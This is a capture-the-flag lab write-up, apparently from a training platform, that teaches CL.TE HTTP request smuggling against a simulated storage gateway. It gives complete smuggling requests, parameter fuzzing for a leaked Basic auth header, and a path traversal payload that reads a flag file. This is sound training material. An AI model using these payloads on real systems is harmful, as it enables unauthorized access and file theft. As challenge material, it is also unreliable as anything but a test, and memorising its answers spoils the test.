# TeamShelf Edge

**Description of the lab:**

TeamShelf Edge is a realistic cloud-storage challenge focused on HTTP request smuggling. Learners interact with a PDF-only document intake flow, discover an internal upload-review queue from a rejection notice, recover an archived Basic authorization header, and abuse a backend archive-reader path traversal to read `/home/local.txt`.

Lab details:

- **Difficulty:** Hard  
- **Type:** AppSec  
- **Theme:** Web  
- **Topics:** HTTP request smuggling, CL.TE desync, upload validation, Burp Suite, parameter fuzzing, path traversal

---

## 1. Lab Context

TeamShelf is a team storage service with public file browsing and a PDF-only retention-document intake workflow. The public edge gateway blocks administrative paths, but it reuses an HTTP/1.1 upstream connection to the backend object service. The edge frames requests by `Content-Length`, while the backend honors `Transfer-Encoding: chunked`, creating a CL.TE desync. Learners first trigger a hardened upload rejection notice that reveals suspicious files are reviewed in `/admin?queue=upload-review`, then use request smuggling to reach the backend-only queue. The queue contains archive history from a restore migration where a legacy connector header was accidentally archived and never rotated.

---

## 2. Lab Infrastructure

Single AWS Ubuntu 26 host running one Docker container.

- Public listener: TeamShelf Edge Gateway on `0.0.0.0:8080`.
- Internal listener: TeamShelf Object Service on `127.0.0.1:9001` inside the container only.
- Host flag mount: `/home/local.txt` mounted read-only to `/home/local.txt` in the container.

Only port `8080` is published to the host. The `127.0.0.1:9001` backend is not exposed through Docker or the AWS security group; it exists only to model the front-end/back-end parser mismatch needed for CL.TE request smuggling. The flag bind mount is required so the platform flag persists across rebuilds and reboots.

![TeamShelf infrastructure](images/image.png)

---

## 3. Attack Kill Chain

![TeamShelf attack kill chain](images/image-1.png)

| Phase | Description | Evidence / Where to look | Tools / Hints |
|---|---|---|---|
| Recon | Browse the TeamShelf workspace and identify file, upload, and health routes. | `/`, `/upload`, `/api/health`, `/api/files` | Browser, Burp Proxy |
| Upload validation | Try to bypass the PDF-only intake check with a fake PDF. | Rejection notice mentions `/admin?queue=upload-review` | Burp Repeater |
| Access control check | Confirm normal `/admin` requests are blocked by the edge gateway. | `Server: TeamShelf-Edge/4.18`, HTTP 404 | Burp Repeater |
| Desync | Send a CL.TE request, then send a trigger request to read the queued backend response. | Backend returns the admin review queue to the trigger request. | Burp Repeater, HTTP/1.1 |
| Credential access | Request `/admin?queue=upload-review` through smuggling and read the archived restore connector header. | `Authorization: Basic c3Zj...` | Burp Repeater |
| Parameter discovery | Fuzz or test archive selector parameter names until the archive log returns. | `id` returns the audit log with HTTP 200. | Player-chosen tooling such as ffuf, Burp Intruder, or Repeater |
| Collection | Abuse `/admin/archive?id=...` path traversal to read `/home/local.txt`. | Response body contains the flag. | Basic auth plus `../../../home/local.txt` |

---

## 4. MITRE ATT&CK Mapping

| Tactic | ID | Technique | Where Observed | IOCs / Artifacts |
|---|---|---|---|---|
| Initial Access | T1190 | Exploit Public-Facing Application | CL.TE desync against TeamShelf Edge Gateway | `Content-Length` and `Transfer-Encoding: chunked` in one request |
| Collection | T1005 | Data from Local System | Backend archive reader opens `/home/local.txt` | `/admin/archive?id=../../../home/local.txt` |

---

## 5. Lab Prerequisites

| Resource | Location / URL | Credentials / Notes |
|---|---|---|
| TeamShelf web app | `http://<instance-ip>:8080/` | No public credentials required |

---

## 6. Investigation & Analysis

### Q1: Which public workflow reveals the admin review queue?

**Objective**  
Trigger the PDF-only upload validation and identify the internal review-queue URL from the rejection notice.

**Why it matters**  
The admin route is not intended to be found by path fuzzing. The realistic clue comes from the public upload workflow that tells users where suspicious files go for review.

**Where to look (artifacts)**  
- Web upload form
- `POST /upload`
- JSON field `notice`

**Methodology / Steps**  
1. Proxy the site through Burp.
2. Submit a `.pdf` upload whose body is not a valid PDF.
3. Send the upload request to Repeater.
4. Read the JSON rejection notice.

**Commands / Queries**  
```http
POST /upload HTTP/1.1
Host: <instance-ip>:8080
Content-Type: multipart/form-data; boundary=----TeamShelf

------TeamShelf
Content-Disposition: form-data; name="document"; filename="quarterly-report.pdf"
Content-Type: application/pdf

not a pdf
------TeamShelf--
```

**Output**
```json
{
  "error": "upload rejected",
  "notice": "Suspicious files are routed to the Admin Review queue: /admin?queue=upload-review"
}
```

**Answer**  
`/admin?queue=upload-review`
---

### Q2: Which route proves that normal users cannot directly reach the admin queue?

**Objective**  
Show that normal external requests cannot directly reach `/admin`.

**Why it matters**  
The request smuggling vulnerability is useful because the front-end gateway applies access control before forwarding normal admin requests.

**Where to look (artifacts)**  
- HTTP response headers
- `Server: TeamShelf-Edge/4.18`

**Methodology / Steps**  
1. Send a direct request for `/admin?queue=upload-review`.
2. Confirm the response comes from the edge gateway.

**Commands / Queries**  
```http
GET /admin?queue=upload-review HTTP/1.1
Host: <instance-ip>:8080
Connection: close
```

**Output**
```text
HTTP/1.1 404 Not Found
Server: TeamShelf-Edge/4.18
```

**Answer**  
`/admin is blocked by the edge gateway with HTTP 404.`
---

### Q3: What CL.TE payload reaches the upload review queue?

**Objective**  
Use Burp Repeater to smuggle a backend request for `/admin?queue=upload-review`.

**Why it matters**  
The edge gateway reads the full body using `Content-Length`. The backend treats the same body as chunked, stops at `0`, and parses the remaining bytes as the next request on the reused upstream connection.

**Where to look (artifacts)**  
- Burp Repeater request 1: CL.TE smuggle
- Burp Repeater request 2: normal trigger
- Response to the trigger request

**Methodology / Steps**  
1. Use HTTP/1.1 in Burp.
2. Send the smuggle request first.
3. Immediately send the trigger request.
4. Read the trigger response; it should contain the admin review queue.

**Commands / Queries**  
Request 1:

```http
POST /upload HTTP/1.1
Host: <instance-ip>:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin?queue=upload-review HTTP/1.1
Host: teamshelf.local
Connection: keep-alive

```

Request 2:

```http
GET /api/health HTTP/1.1
Host: <instance-ip>:8080
Connection: close

```

**Output**
```html
<h1>Upload Review Queue</h1>
<code>Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2</code>
<code>GET /admin/archive</code>
```

**Answer**  
`The smuggled /admin?queue=upload-review request reveals an archived Basic authorization header and /admin/archive.`
---

### Q4: Which archive query parameter selects the restored document?

**Objective**  
Discover the query parameter accepted by `/admin/archive`.

**Why it matters**  
The upload-review queue leaks archive history from a restore migration. That history shows a reusable Basic authorization header and says restore clients use a query-string selector, but it does not reveal the parameter name.

**Where to look (artifacts)**  
- `/admin/archive`
- HTTP status and body differences after each smuggled attempt

**Methodology / Steps**  
1. Copy the archived `Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2` header into the smuggled archive request.
2. Test or fuzz common selector names such as `file`, `path`, `object`, `key`, `archive`, and `id`.
3. Send a trigger request after each smuggle.
4. The correct parameter returns the audit log with HTTP 200.

This can be done manually in Burp Repeater, with Burp Intruder, or with an external fuzzer such as ffuf if the player builds their own CL.TE request template and uses their own wordlist. The lab does not provide a wordlist.

**Commands / Queries**  
Example failed attempt:

```http
POST /upload HTTP/1.1
Host: <instance-ip>:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin/archive?file=audit/2026-06-sync.log HTTP/1.1
Host: teamshelf.local
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive

```

Failed selector response:

```json
{
  "error": "missing id"
}
```

Correct attempt:

```http
POST /upload HTTP/1.1
Host: <instance-ip>:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin/archive?id=audit/2026-06-sync.log HTTP/1.1
Host: teamshelf.local
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive

```

Trigger request:

```http
GET /api/health HTTP/1.1
Host: <instance-ip>:8080
Connection: close

```

**Output**
```text
2026-06-08T22:14:09Z upload quarantine sync queued by retention-worker
2026-06-08T22:15:33Z archive reader migration deferred
2026-06-08T22:17:02Z restore connector rotation ticket still open
```

**Answer**  
`id`
---

### Q5: What is the flag in `/home/local.txt`?

**Objective**  
Use the archived Basic authorization header and the path traversal bug to read the mounted flag.

**Why it matters**  
This demonstrates full impact: a public edge desync reaches a backend-only admin queue, then a backend file-read flaw exposes local host data mounted into the container.

**Where to look (artifacts)**  
- `/admin/archive`
- query parameter `id`
- path traversal sequence `../../../home/local.txt`

**Methodology / Steps**  
1. Keep the archived Basic authorization header from the previous step.
2. Replace the archive object ID with `../../../home/local.txt`.
3. Send the smuggle request.
4. Send the trigger request and read the queued response.

**Commands / Queries**  
Request 1:

```http
POST /upload HTTP/1.1
Host: <instance-ip>:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin/archive?id=../../../home/local.txt HTTP/1.1
Host: teamshelf.local
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive

```

Request 2:

```http
GET /api/health HTTP/1.1
Host: <instance-ip>:8080
Connection: close

```

**Output**
```text
SECdojo{...}
```

**Answer**  
`<contents of /home/local.txt>`
